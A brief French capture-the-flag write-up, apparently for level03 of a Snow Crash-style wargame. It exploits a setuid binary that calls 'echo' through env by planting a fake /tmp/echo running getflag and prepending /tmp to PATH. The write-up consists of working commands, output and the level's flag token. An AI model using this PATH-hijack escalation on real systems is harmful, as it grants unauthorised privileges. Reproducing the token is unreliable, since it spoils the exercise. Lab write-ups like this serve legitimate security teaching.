une fois connecté : 
ls -l
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03

on remarque que le user flag03 à les droits d'exec

strings level03

...
/usr/bin/env echo Exploit me
...

le fichier execute un echo

on cree un faux echo qui remplacera et executera getflag

echo "getflag" > /tmp/echo

on le rend executable:
chmod 755 /tmp/echo

on rajoute /tmp en début de notre PATH:
PATH=/tmp:$PATH

et on execute level03
./leve03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus